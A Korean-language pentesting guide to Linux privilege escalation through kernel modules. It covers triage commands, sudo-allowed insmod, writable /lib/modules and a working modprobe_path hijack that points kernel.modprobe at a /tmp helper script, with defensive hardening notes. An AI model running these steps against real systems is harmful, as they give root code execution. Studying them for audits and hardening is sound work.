# Kernel Modules 및 modprobe Abuse

{{#include ../../banners/hacktricks-training.md}}

## Kernel module 및 module-loading misconfigurations

Linux privilege escalation 검토에서 Kernel module 지원은 영향도가 높은 영역입니다. 모든 unsigned-module 메시지를 그 자체로 exploitable하다고 간주하지 말고, 다음과 같은 실질적인 질문에 답하는 데 활용하세요.

- 현재 사용자가 `sudo`, capabilities 또는 writable helper path를 통해 modules를 load할 수 있는가?
- module loading이 아직 활성화되어 있는가?
- module signature enforcement가 비활성화되어 있는가?
- module directories 또는 module files가 writable한가?
- 발생한 일을 확인하기 위해 kernel logs를 읽을 수 있는가?

빠른 triage:
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
cat /proc/sys/kernel/module_sig_enforce 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
해석:

- `modules_disabled=1`은 재부팅할 때까지 새 모듈을 로드할 수 없다는 의미입니다.
- `module_sig_enforce=1`은 일반적으로 서명되지 않은 모듈을 차단합니다.
- `dmesg_restrict=0`은 많은 시스템에서 권한이 없는 사용자가 kernel 로그를 읽을 수 있도록 합니다.
- `/lib/modules/$(uname -r)/` 아래의 쓰기 가능한 경로는 위험합니다. 모듈 검색 및 자동 로딩이 해당 트리를 신뢰할 수 있기 때문입니다.

### 모듈 로드 및 kernel 출력 읽기

로컬 모듈을 로드할 정당한 권한이 있다면 `insmod`는 지정한 정확한 `.ko` 파일을 삽입합니다. 모듈의 init 함수가 즉시 실행되고, `printk()`로 작성된 메시지는 kernel 로그에 표시됩니다.

검토 또는 lab 환경을 위한 최소 workflow:
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
`sudo -l`에서 `insmod`, `modprobe` 또는 이를 둘러싼 wrapper의 실행이 허용된다면, 이를 치명적인 문제로 간주하세요:
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### Sudo-allowed `insmod`

사용자가 `insmod`를 실행할 수 있도록 허용하는 sudo 규칙은 일반적인 administrative helper를 허용하는 것과 비교할 수 없습니다. `.ko`가 삽입되는 즉시 모듈의 initialization code가 kernel context에서 실행되므로, 실제 검토 시 핵심 질문은 다음과 같습니다. "이 사용자가 로드되는 모듈을 선택하거나 수정할 수 있는가?"

일반적인 검토 흐름:
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
사용자가 임의의 `.ko` 파일을 제공할 수 있다면, authorized assessment에서는 해당 규칙을 full system compromise로 간주해야 합니다. 더 안전한 운영 패턴은 sudo를 통한 module loading 위임을 피하는 것입니다. 불가피한 경우에는 정확한 경로, 소유권, 권한, signing policy 및 제거 workflow를 제한해야 합니다.

통제된 lab에서 harmless한 module-building pattern을 사용하려면, 최소한의 source와 Makefile은 다음과 같습니다:
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
승인된 lab에서만 빌드하고 로드하세요:
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### `kernel.modprobe` / `modprobe_path` abuse checks

`kernel.modprobe`는 커널이 module-loading 지원을 필요로 할 때 호출하는 userspace helper를 제어합니다. 공격자가 이를 쓰기 가능한 executable 경로로 변경하고 알 수 없는 binary format 또는 다른 module request 경로를 트리거할 수 있다면, root code execution으로 이어질 수 있습니다.

현재 helper를 확인합니다:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
영향을 줄 수 있는지 확인:
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
일반적인 실습 전용 패턴:
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger an unknown executable format so the kernel attempts helper logic
printf '\\xff\\xff\\xff\\xff' > /tmp/unknown
chmod +x /tmp/unknown
/tmp/unknown 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
강화된 시스템에서는 권한이 없는 사용자가 `kernel.modprobe`를 쓸 수 없거나, helper 경로에 쓰기 권한이 없거나, module-loading 경로가 차단되어 있으므로 이 작업이 실패해야 합니다.

### 쓰기 가능한 `/lib/modules` 검토

쓰기 가능한 module 디렉터리는 이후 `modprobe`가 호출되는 방식에 따라 module 교체, 악성 module 심기 또는 auto-load 악용을 허용할 수 있습니다.

쓰기 가능한 위치를 검토합니다:
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
쓰기 가능한 module content를 발견했다면, module이 어떻게 검색되는지 확인하세요:
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
방어 참고 사항:

- `/lib/modules`가 `root:root` 소유이고 사용자에게 쓰기 권한이 없도록 유지합니다.
- 운영상 가능한 경우 부팅 후 `kernel.modules_disabled=1`을 설정합니다.
- loadable modules가 필요한 시스템에서는 module signing을 강제합니다.
- `/proc/sys/kernel/modprobe`, `/lib/modules`에 대한 쓰기 작업과 예상치 못한 `insmod`/`modprobe` 실행을 모니터링합니다.
